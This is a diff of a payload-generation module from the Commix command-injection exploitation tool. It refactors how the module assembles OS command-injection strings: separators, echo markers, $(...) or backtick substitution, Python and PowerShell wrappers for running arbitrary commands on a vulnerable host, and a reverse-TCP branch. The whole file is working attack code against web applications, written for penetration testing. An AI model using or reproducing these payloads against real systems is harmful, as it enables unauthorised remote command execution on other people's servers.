@@ -3,7 +3,7 @@
 
 """
 This file is part of Commix Project (https://commixproject.com).
-Copyright (c) 2014-2024 Anastasios Stasinopoulos (@ancst).
+Copyright (c) 2014-2025 Anastasios Stasinopoulos (@ancst).
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
@@ -36,41 +36,26 @@ def decision(separator, TAG, randv1, randv2):
               "\"') do @set /p = " + TAG + "%i" + TAG + TAG + settings.CMD_NUL
               )
   else:
-    if not settings.WAF_ENABLED:
-      if settings.USE_BACKTICKS:
-        math_calc = "`expr " + str(randv1) + " %2B " + str(randv2) + "`"
-      else:
-        math_calc = "$((" + str(randv1) + "%2B" + str(randv2) + "))"
+    if settings.USE_BACKTICKS or settings.WAF_ENABLED:
+      math_calc = settings.CMD_SUB_PREFIX + "expr " + str(randv1) + " %2B " + str(randv2) + settings.CMD_SUB_SUFFIX
     else:
-      if settings.USE_BACKTICKS:
-        math_calc = "`expr " + str(randv1) + " %2B " + str(randv2) + "`"
-      else:
-        math_calc = "$(expr " + str(randv1) + " %2B " + str(randv2) + ")"
+      math_calc = settings.CMD_SUB_PREFIX + "(" + str(randv1) + "%2B" + str(randv2) + "))"
 
     if settings.SKIP_CALC:
-      if settings.USE_BACKTICKS:
-        payload = (separator +
-                  "echo " + TAG +
-                  TAG + "" + TAG + ""
-                   )
-      else:
-        payload = (separator +
-                  "echo " + TAG +
-                  "$(echo " + TAG + ")" + TAG + ""
-                   )
+      payload = (separator +
+                "echo " + TAG +
+                settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  + TAG 
+                )
     else:
-      if settings.USE_BACKTICKS:
-        payload = (separator +
-                  "echo " + TAG +
-                  math_calc +
-                  TAG + "" + TAG + ""
-                   )
-      else:
-        payload = (separator +
-                  "echo " + TAG +
-                  math_calc +
-                  "$(echo " + TAG + ")" + TAG + ""
-                   )
+      payload = (separator +
+                "echo " + TAG +
+                math_calc +
+                settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  + TAG 
+                )
+
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
+
   return payload
 
 """
@@ -102,6 +87,10 @@ def decision_alter_shell(separator, TAG, randv1, randv2):
                 TAG + "'%2B'" +
                 TAG + "')\""
                 )
+
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
+
   return payload
 
 """
@@ -110,7 +99,8 @@ Execute shell commands on vulnerable host.
 def cmd_execution(separator, TAG, cmd):
   if settings.TARGET_OS == settings.OS.WINDOWS:
     if settings.REVERSE_TCP:
-      payload = (separator + cmd + settings.SINGLE_WHITESPACE
+      payload = (separator + 
+                cmd + settings.SINGLE_WHITESPACE
                 )
     else:
       payload = (separator +
@@ -119,23 +109,17 @@ def cmd_execution(separator, TAG, cmd):
                 "\"') do @set /p = " + TAG + TAG + "%i" + TAG + TAG + settings.CMD_NUL
                 )
   else:
-    settings.USER_SUPPLIED_CMD = cmd
-    if settings.USE_BACKTICKS:
-      cmd_exec = "`" + cmd + "`"
-      payload = (separator +
-                "echo " + TAG +
-                "" + TAG + "" +
-                cmd_exec +
-                "" + TAG + "" + TAG + ""
-                )
-    else:
-      cmd_exec = "$(" + cmd + ")"
-      payload = (separator +
-                "echo " + TAG +
-                "$(echo " + TAG + ")" +
-                cmd_exec +
-                "$(echo " + TAG + ")" + TAG + ""
-                )
+    settings.USER_APPLIED_CMD = cmd
+    cmd_exec = settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX 
+    payload = (separator +
+              "echo " + TAG +
+              settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  +
+              cmd_exec +
+              settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX  + TAG
+              )
+
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
 
   return payload
 
@@ -145,25 +129,29 @@ __Warning__: The alternative shells are still experimental.
 def cmd_execution_alter_shell(separator, TAG, cmd):
   if settings.TARGET_OS == settings.OS.WINDOWS:
     if settings.REVERSE_TCP:
-      payload = (separator + cmd + settings.SINGLE_WHITESPACE
+      payload = (separator + 
+                cmd + settings.SINGLE_WHITESPACE
                 )
     else:
       payload = (separator +
                 "for /f \"tokens=*\" %i in ('" +
-                settings.WIN_PYTHON_INTERPRETER + " -c \"import os; os.system('powershell.exe -InputFormat none write-host " + TAG + TAG + " $(" + cmd + ") "+ TAG + TAG + "')\"" +
+                settings.WIN_PYTHON_INTERPRETER + 
+                " -c \"import os; os.system('powershell.exe -InputFormat none write-host " + 
+                TAG + TAG + " $(" + cmd + ") "+ TAG + TAG + "')\"" +
                 "') do @set /p=%i " + settings.CMD_NUL
                 )
-
   else:
+    settings.USER_APPLIED_CMD = cmd
+    cmd_exec = settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX
+    payload = (separator +
+              settings.LINUX_PYTHON_INTERPRETER + 
+              " -c \"print('" + TAG + "'%2B'" + TAG + "'%2B'" + settings.CMD_SUB_PREFIX + "echo " + cmd_exec + settings.CMD_SUB_SUFFIX + "'%2B'" + 
+              TAG + "'%2B'" + TAG + "')\""
+              )
 
-    if settings.USE_BACKTICKS:
-      payload = (separator +
-                settings.LINUX_PYTHON_INTERPRETER + " -c \"print('" + TAG + "'%2B'" + TAG + "'%2B'$(echo `" + cmd + ")`" + TAG + "'%2B'" + TAG + "')\""
-                )
-    else:
-      payload = (separator +
-                settings.LINUX_PYTHON_INTERPRETER + " -c \"print('" + TAG + "'%2B'" + TAG + "'%2B'$(echo $(" + cmd + "))'%2B'" + TAG + "'%2B'" + TAG + "')\""
-                )
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
+
   return payload
 
 # eof
